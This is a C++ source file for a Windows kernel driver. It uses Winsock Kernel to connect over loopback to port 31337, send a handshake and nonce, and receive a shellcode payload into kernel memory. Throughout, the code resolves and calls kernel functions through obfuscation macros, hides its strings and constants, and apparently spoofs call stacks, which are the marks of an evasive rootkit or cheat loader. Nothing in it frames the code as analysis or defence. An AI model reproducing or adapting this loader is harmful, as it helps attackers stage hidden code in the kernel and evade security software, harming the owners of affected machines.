#define UN_WSK_RECV_CAP    (128 * 1024)

#define UN_LB_PORT         31337
#define UN_LB_MAGIC        ""
#define UN_LB_MAGIC_LEN    8
#define UN_LB_HANDSHAKE    "UN_LB*"

typedef struct _WSK_COMPLETION_CTX {
    ULONG64 KeSetEventFn;
    PKEVENT Event;
} WSK_COMPLETION_CTX, * PWSK_COMPLETION_CTX;

struct WskContext {
    ULONG64 NT_Base, Netio_Base;
    PMap pMap;
    PWSK_PROVIDER_NPI WskProviderNpi;
    WSK_REGISTRATION* WskRegistration;
    WSK_CLIENT_DISPATCH* WskClientDispatch;
    PIRP Irp;
    KEVENT Event;
    WSK_COMPLETION_CTX Ctx;
    PEPROCESS Process;
    KAPC_STATE ApcState;
    BOOLEAN WskRegistered;
    BOOLEAN ProviderCaptured;
};

struct WskSession {
    WskContext* ctx;
    PWSK_SOCKET Socket;
};

static __forceinline NTSTATUS WSKCompletionRoutine(PDEVICE_OBJECT, PIRP, PVOID Context) {
    if (Context) {
        auto c = (PWSK_COMPLETION_CTX)Context;
        ((decltype(&KeSetEvent))c->KeSetEventFn)(c->Event, IO_NO_INCREMENT, FALSE);
    }
    return STATUS_MORE_PROCESSING_REQUIRED;
}

static __forceinline VOID ResetIrp(ULONG64 NT_Base, PIRP Irp, PVOID Context) {
    auto _IoReuseIrp = KLI_FN(NT_Base, IoReuseIrp);
    if (_IoReuseIrp) KLI_OBFUSCATE_CALL(_IoReuseIrp)(Irp, STATUS_UNSUCCESSFUL);
    auto sp = IoGetNextIrpStackLocation(Irp);
    sp->CompletionRoutine = WSKCompletionRoutine;
    sp->Context = Context;
    sp->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;
}

template <typename Op, typename... Args>
static __forceinline NTSTATUS WskSubmitAndWait(WskContext* ctx, Op&& op, PULONG_PTR outInfo, Args&&... args) {
    auto _KeClearEvent = KLI_FN(ctx->NT_Base, KeClearEvent);
    auto _KeWaitForSingleObject = KLI_FN(ctx->NT_Base, KeWaitForSingleObject);
    if (!_KeClearEvent || !_KeWaitForSingleObject) return STATUS_DEVICE_NOT_READY;

    KLI_OBFUSCATE_CALL(_KeClearEvent)(&ctx->Event);
    KLI_OBFUSCATE_CALL(ResetIrp)(ctx->NT_Base, ctx->Irp, &ctx->Ctx);

    NTSTATUS Status = op(args..., ctx->Irp);
    if (Status == STATUS_PENDING) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -5 * 10000000LL;
        KLI_OBFUSCATE_CALL(_KeWaitForSingleObject)(&ctx->Event, Executive, KernelMode, FALSE, &timeout);
        Status = ctx->Irp->IoStatus.Status;
    }
    if (outInfo) *outInfo = ctx->Irp->IoStatus.Information;
    return Status;
}

static __forceinline NTSTATUS WskOpSocket(PWSK_PROVIDER_NPI Npi, PIRP Irp) {
    return Npi->Dispatch->WskSocket(Npi->Client, AF_INET, SOCK_STREAM, IPPROTO_TCP, WSK_FLAG_CONNECTION_SOCKET, nullptr, nullptr, nullptr, nullptr, nullptr, Irp);
}

static __forceinline NTSTATUS WskOpBind(PWSK_SOCKET s, PSOCKADDR a, PIRP Irp) {
    return ((PWSK_PROVIDER_CONNECTION_DISPATCH)s->Dispatch)->WskBind(s, a, 0, Irp); 
}

static __forceinline NTSTATUS WskOpConnect(PWSK_SOCKET s, PSOCKADDR a, PIRP Irp) { 
    return ((PWSK_PROVIDER_CONNECTION_DISPATCH)s->Dispatch)->WskConnect(s, a, 0, Irp); 
}

static __forceinline NTSTATUS WskOpSend(PWSK_SOCKET s, PWSK_BUF b, PIRP Irp) { 
    return ((PWSK_PROVIDER_CONNECTION_DISPATCH)s->Dispatch)->WskSend(s, b, 0, Irp);
}

static __forceinline NTSTATUS WskOpReceive(PWSK_SOCKET s, PWSK_BUF b, PIRP Irp) { 
    return ((PWSK_PROVIDER_CONNECTION_DISPATCH)s->Dispatch)->WskReceive(s, b, 0, Irp);
}

static __forceinline NTSTATUS WskOpClose(PWSK_SOCKET s, PIRP Irp) { 
    return ((PWSK_PROVIDER_BASIC_DISPATCH)s->Dispatch)->WskCloseSocket(s, Irp);
}

static __forceinline PVOID WskAllocPool(ULONG64 NT_Base, ULONG32 Tag, SIZE_T Size) {
    auto _ExAllocatePoolWithTag = KLI_FN(NT_Base, ExAllocatePoolWithTag);
    if (!_ExAllocatePoolWithTag) return nullptr;
    PVOID p = KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, Size, Tag);
    if (p) __stosb((PBYTE)p, 0, Size);
    return p;
}

template <typename Op, typename... Args>
static __declspec(noinline) NTSTATUS WskViaMdl(WskContext* ctx, PVOID Buffer, ULONG Size, LOCK_OPERATION AccessMode, PULONG_PTR outInfo, Op&& op, Args&&... args) {
    auto _IoAllocateMdl = KLI_FN(ctx->NT_Base, IoAllocateMdl);
    auto _IoFreeMdl = KLI_FN(ctx->NT_Base, IoFreeMdl);
    auto _MmProbeAndLockPages = KLI_FN(ctx->NT_Base, MmProbeAndLockPages);
    auto _MmUnlockPages = KLI_FN(ctx->NT_Base, MmUnlockPages);
    if (!_IoAllocateMdl || !_IoFreeMdl || !_MmProbeAndLockPages || !_MmUnlockPages) return STATUS_DEVICE_NOT_READY;

    WSK_BUF Buf{};
    Buf.Mdl = KLI_OBFUSCATE_CALL(_IoAllocateMdl)(Buffer, Size, FALSE, FALSE, nullptr);
    if (!Buf.Mdl) return STATUS_INSUFFICIENT_RESOURCES;
    KLI_OBFUSCATE_CALL(_MmProbeAndLockPages)(Buf.Mdl, KernelMode, AccessMode);
    Buf.Length = Size;

    NTSTATUS Status = WskSubmitAndWait(ctx, op, outInfo, args..., &Buf);

    KLI_OBFUSCATE_CALL(_MmUnlockPages)(Buf.Mdl);
    KLI_OBFUSCATE_CALL(_IoFreeMdl)(Buf.Mdl);
    return Status;
}

static __forceinline VOID WskContextCleanup(WskContext* ctx) {
    auto _IoFreeIrp = KLI_FN(ctx->NT_Base, IoFreeIrp);
    auto _WskReleaseProviderNPI = KLI_FN(ctx->Netio_Base, WskReleaseProviderNPI);
    auto _WskDeregister = KLI_FN(ctx->Netio_Base, WskDeregister);
    auto _KeUnstackDetachProcess = KLI_FN(ctx->NT_Base, KeUnstackDetachProcess);
    auto _ObfDereferenceObject = KLI_FN(ctx->NT_Base, ObfDereferenceObject);
    auto _ExFreePoolWithTag = KLI_FN(ctx->NT_Base, ExFreePoolWithTag);

    if (ctx->Irp && _IoFreeIrp) KLI_OBFUSCATE_CALL(_IoFreeIrp)(ctx->Irp);
    if (ctx->ProviderCaptured && ctx->WskRegistration && _WskReleaseProviderNPI) KLI_OBFUSCATE_CALL(_WskReleaseProviderNPI)(ctx->WskRegistration);
    if (ctx->WskRegistered && ctx->WskRegistration && _WskDeregister) KLI_OBFUSCATE_CALL(_WskDeregister)(ctx->WskRegistration);
    if (ctx->WskProviderNpi && _ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(ctx->WskProviderNpi, ctx->pMap->MEMORY_TAG.yKeV);
    if (ctx->WskRegistration && _ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(ctx->WskRegistration, ctx->pMap->MEMORY_TAG.yKeV);
    if (ctx->WskClientDispatch && _ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(ctx->WskClientDispatch, ctx->pMap->MEMORY_TAG.yKeV);
    if (ctx->Process && _KeUnstackDetachProcess) KLI_OBFUSCATE_CALL(_KeUnstackDetachProcess)(&ctx->ApcState);
    if (ctx->Process && _ObfDereferenceObject) KLI_OBFUSCATE_CALL(_ObfDereferenceObject)(ctx->Process);
}

static __declspec(noinline) NTSTATUS WskContextInit(WskContext* ctx, PMap pMap, ULONG64 NT_Base, ULONG64 Netio_Base) {
    ctx->NT_Base = NT_Base; ctx->Netio_Base = Netio_Base; ctx->pMap = pMap;
    ctx->Irp = nullptr; ctx->WskProviderNpi = nullptr; ctx->WskRegistration = nullptr;
    ctx->WskClientDispatch = nullptr; ctx->Process = nullptr;
    ctx->WskRegistered = FALSE; ctx->ProviderCaptured = FALSE;

    auto _PsLookupProcessByProcessId = KLI_FN(NT_Base, PsLookupProcessByProcessId);
    auto _KeStackAttachProcess = KLI_FN(NT_Base, KeStackAttachProcess);
    auto _IoAllocateIrp = KLI_FN(NT_Base, IoAllocateIrp);
    auto _KeInitializeEvent = KLI_FN(NT_Base, KeInitializeEvent);
    auto _KeSetEvent = KLI_FN(NT_Base, KeSetEvent);
    auto _WskRegister = KLI_FN(Netio_Base, WskRegister);
    auto _WskCaptureProviderNPI = KLI_FN(Netio_Base, WskCaptureProviderNPI);

    if (!_PsLookupProcessByProcessId || !_KeStackAttachProcess || !_IoAllocateIrp || !_KeInitializeEvent || !_KeSetEvent || !_WskRegister || !_WskCaptureProviderNPI) return STATUS_DEVICE_NOT_READY;

    NTSTATUS Status = KLI_OBFUSCATE_CALL(_PsLookupProcessByProcessId)((HANDLE)4, &ctx->Process);
    if (!NT_SUCCESS(Status)) return Status;

    KLI_OBFUSCATE_CALL(_KeStackAttachProcess)(ctx->Process, &ctx->ApcState);

    ctx->WskClientDispatch = (WSK_CLIENT_DISPATCH*)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, sizeof(WSK_CLIENT_DISPATCH));
    ctx->WskRegistration = (WSK_REGISTRATION*)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, sizeof(WSK_REGISTRATION));
    ctx->WskProviderNpi = (WSK_PROVIDER_NPI*)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, sizeof(WSK_PROVIDER_NPI));

    if (!ctx->WskClientDispatch || !ctx->WskRegistration || !ctx->WskProviderNpi) { 
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Fail;
    }

    ctx->WskClientDispatch->Version = MAKE_WSK_VERSION(1, 0);
    {
        WSK_CLIENT_NPI WskClient{};
        WskClient.Dispatch = ctx->WskClientDispatch;
        Status = KLI_OBFUSCATE_CALL(_WskRegister)(&WskClient, ctx->WskRegistration);
        if (!NT_SUCCESS(Status)) goto Fail;
        ctx->WskRegistered = TRUE;
    }

    Status = KLI_OBFUSCATE_CALL(_WskCaptureProviderNPI)(ctx->WskRegistration, WSK_NO_WAIT, ctx->WskProviderNpi);
    if (!NT_SUCCESS(Status)) goto Fail;
    ctx->ProviderCaptured = TRUE;

    ctx->Irp = KLI_OBFUSCATE_CALL(_IoAllocateIrp)(1, FALSE);
    if (!ctx->Irp) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Fail;
    }
    KLI_OBFUSCATE_CALL(_KeInitializeEvent)(&ctx->Event, SynchronizationEvent, FALSE);
    ctx->Ctx.KeSetEventFn = (ULONG64)_KeSetEvent;
    ctx->Ctx.Event = &ctx->Event;
    return STATUS_SUCCESS;

Fail:
    WskContextCleanup(ctx);
    return Status;
}

static __forceinline NTSTATUS WskSocketOpen(WskSession* s, WskContext* ctx) {
    s->ctx = ctx;
    s->Socket = nullptr;
    ULONG_PTR info = 0;
    NTSTATUS st = WskSubmitAndWait(ctx, WskOpSocket, &info, ctx->WskProviderNpi);
    s->Socket = (PWSK_SOCKET)info;
    return (!NT_SUCCESS(st) || !s->Socket) ? st : STATUS_SUCCESS;
}

static __forceinline NTSTATUS WskSocketBind(WskSession* s) {
    SOCKADDR_IN a{};
    a.sin_family = AF_INET;
    a.sin_addr.S_un.S_addr = KLI_OBF_CONST(ULONG, INADDR_ANY);
    return WskSubmitAndWait(s->ctx, WskOpBind, nullptr, s->Socket, (PSOCKADDR)&a);
}

static __forceinline NTSTATUS WskSocketConnect(WskSession* s, ULONG Ip, USHORT Port) {
    SOCKADDR_IN a{};
    a.sin_family = AF_INET;
    a.sin_addr.S_un.S_addr = Ip; 
    a.sin_port = Port;
    return WskSubmitAndWait(s->ctx, WskOpConnect, nullptr, s->Socket, (PSOCKADDR)&a);
}

static __forceinline NTSTATUS WskSocketSendAll(WskSession* s, PVOID Buffer, ULONG Size) {
    ULONG sent = 0;
    while (sent < Size) {
        ULONG_PTR info = 0;
        NTSTATUS ss = WskViaMdl(s->ctx, (PUCHAR)Buffer + sent, Size - sent, IoReadAccess, &info, WskOpSend, s->Socket);
        if (!NT_SUCCESS(ss)) return ss;
        if (!info) return STATUS_PORT_DISCONNECTED;
        sent += (ULONG)info;
    }
    return STATUS_SUCCESS;
}

static __forceinline NTSTATUS WskSocketRecvAll(WskSession* s, PVOID Buffer, ULONG Size, PULONG OutTotal) {
    ULONG total = 0;
    NTSTATUS rs = STATUS_SUCCESS;
    for (;;) {
        ULONG remain = Size - total;
        if (!remain) break;
        ULONG_PTR info = 0;
        rs = WskViaMdl(s->ctx, (PUCHAR)Buffer + total, remain, IoWriteAccess, &info, WskOpReceive, s->Socket);
        if (!NT_SUCCESS(rs)) break;
        if (!info) {
            rs = STATUS_SUCCESS;
            break;
        }
        total += (ULONG)info;
    }
    if (OutTotal) *OutTotal = total;
    if (total > 0 && (rs == STATUS_CONNECTION_RESET || rs == STATUS_CONNECTION_DISCONNECTED || rs == STATUS_FILE_CLOSED || rs == STATUS_LOCAL_DISCONNECT)) rs = STATUS_SUCCESS;
    return rs;
}

static __forceinline VOID WskSocketClose(WskSession* s) {
    if (s->Socket) {
        WskSubmitAndWait(s->ctx, WskOpClose, nullptr, s->Socket);
        s->Socket = nullptr;
    }
}

static __forceinline SIZE_T MyStrLen(CONST CHAR* s) { 
    SIZE_T n = 0; 
    while (s && s[n]) n++;
    return n;
}

static __forceinline BOOL MyMemEqual(CONST UCHAR* a, CONST UCHAR* b, SIZE_T n) {
    for (SIZE_T i = 0; i < n; i++) {
        if (a[i] != b[i]) return FALSE;
    }
    return TRUE;
}

static __declspec(noinline) NTSTATUS WskTryPort(WskContext* ctx, USHORT netPort, ULONG loopbackIp, PVOID req, ULONG reqSize, PVOID rsp, ULONG rspCap, PULONG OutTotal) {
    if (OutTotal) *OutTotal = 0;
    WskSession s;
    NTSTATUS st = WskSocketOpen(&s, ctx);
    if (!NT_SUCCESS(st) || !s.Socket) return st;

    st = WskSocketBind(&s);
    if (!NT_SUCCESS(st)) { 
        WskSocketClose(&s);
        return st;
    }

    st = WskSocketConnect(&s, loopbackIp, netPort);
    if (!NT_SUCCESS(st)) { 
        WskSocketClose(&s); 
        return st;
    }

    st = WskSocketSendAll(&s, req, reqSize);
    if (!NT_SUCCESS(st)) {
        WskSocketClose(&s);
        return st;
    }

    ULONG total = 0;
    st = WskSocketRecvAll(&s, rsp, rspCap, &total);
    WskSocketClose(&s);
    if (OutTotal) *OutTotal = total;
    return st;
}

static __forceinline VOID WskFreeBufs(ULONG64 NT_Base, ULONG32 Tag, PUCHAR req, PUCHAR rsp) {
    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    if (req) {
        __stosb((PBYTE)req, 0, 64);
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(req, Tag);
    }
    if (rsp) {
        __stosb((PBYTE)rsp, 0, UN_WSK_RECV_CAP);
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(rsp, Tag);
    }
}

static __declspec(noinline) NTSTATUS RequestShellcodeOverLoopback(PMap pMap, ULONG64 NT_Base, ULONG64 Netio_Base, PUCHAR* outShellcode, PINT outSize) {
    SPOOF_FUNC;

    if (!outShellcode || !outSize) return STATUS_INVALID_PARAMETER;
    *outShellcode = nullptr; *outSize = 0;

    auto _ExAllocatePoolWithTag = KLI_FN(NT_Base, ExAllocatePoolWithTag);
    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    if (!_ExAllocatePoolWithTag || !_ExFreePoolWithTag) return STATUS_DEVICE_NOT_READY;

    auto hsEnc = KLI_SCOPED_ASTR(UN_LB_HANDSHAKE);
    CHAR* hs = (CHAR*)hsEnc;
    SIZE_T hsLen = MyStrLen(hs);

    ULONG64 nonce;
    INT regs[4];
    __cpuid(regs, 1);
    nonce = MBA_XOR(ULONG64, __rdtsc(), MBA_OR(ULONG64, (ULONG64)regs[0] << 32, (ULONG64)regs[3]));

    PUCHAR req = (PUCHAR)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, 64);
    PUCHAR rsp = (PUCHAR)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, UN_WSK_RECV_CAP);
    if (!req || !rsp) {
        WskFreeBufs(NT_Base, pMap->MEMORY_TAG.yKeV, req, rsp);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    SIZE_T off = 0;
    __movsb(req + off, (CONST UCHAR*)hs, hsLen); off += hsLen;
    __movsb(req + off, (CONST UCHAR*)&nonce, sizeof(nonce)); off += sizeof(nonce);

    auto magicEnc = KLI_SCOPED_ASTR(UN_LB_MAGIC);
    CHAR* magic = (CHAR*)magicEnc;
    ULONG port = KLI_OBF_CONST(ULONG, UN_LB_PORT);
    ULONG magicLen = KLI_OBF_CONST(ULONG, UN_LB_MAGIC_LEN);
    ULONG64 loopbackIp = KLI_OBF_CONST(ULONG64, 0x0100007F);

    WskContext* ctx = (WskContext*)WskAllocPool(NT_Base, pMap->MEMORY_TAG.yKeV, sizeof(WskContext));
    if (!ctx) {
        WskFreeBufs(NT_Base, pMap->MEMORY_TAG.yKeV, req, rsp);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    NTSTATUS setupStatus = WskContextInit(ctx, pMap, NT_Base, Netio_Base);
    if (!NT_SUCCESS(setupStatus)) {
        auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
        if (_ExFreePoolWithTag) {
            __stosb((PBYTE)ctx, 0, sizeof(WskContext));
            KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(ctx, pMap->MEMORY_TAG.yKeV);
        }
        WskFreeBufs(NT_Base, pMap->MEMORY_TAG.yKeV, req, rsp);
        return setupStatus;
    }

    NTSTATUS finalStatus = STATUS_PORT_NOT_SET;
    USHORT netPort = (USHORT)(((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
    ULONG recvBytes = 0;

    NTSTATUS st = WskTryPort(ctx, netPort, (ULONG)loopbackIp, req, (ULONG)off, rsp, UN_WSK_RECV_CAP, &recvBytes);

    if (NT_SUCCESS(st) || recvBytes > 0) {
        if (recvBytes >= magicLen + sizeof(nonce) && recvBytes < UN_WSK_RECV_CAP && MyMemEqual(rsp, (CONST UCHAR*)magic, magicLen)) {
            ULONG64 echoNonce;
            __movsb((PUCHAR)&echoNonce, rsp + magicLen, sizeof(nonce));
            if (echoNonce == nonce) {
                INT shellSize = (INT)(recvBytes - magicLen - sizeof(nonce));
                if (shellSize > 0) {
                    PUCHAR shell = (PUCHAR)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, shellSize, pMap->MEMORY_TAG.llhS);
                    if (shell) {
                        __movsb(shell, rsp + magicLen + sizeof(nonce), shellSize);
                        *outShellcode = shell; *outSize = shellSize;
                        finalStatus = STATUS_SUCCESS;
                    }
                }
            }
        }
    }

    WskContextCleanup(ctx);
    {
        auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
        if (_ExFreePoolWithTag) {
            __stosb((PBYTE)ctx, 0, sizeof(WskContext));
            KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(ctx, pMap->MEMORY_TAG.yKeV);
        }
    }
    WskFreeBufs(NT_Base, pMap->MEMORY_TAG.yKeV, req, rsp);
    return finalStatus;
}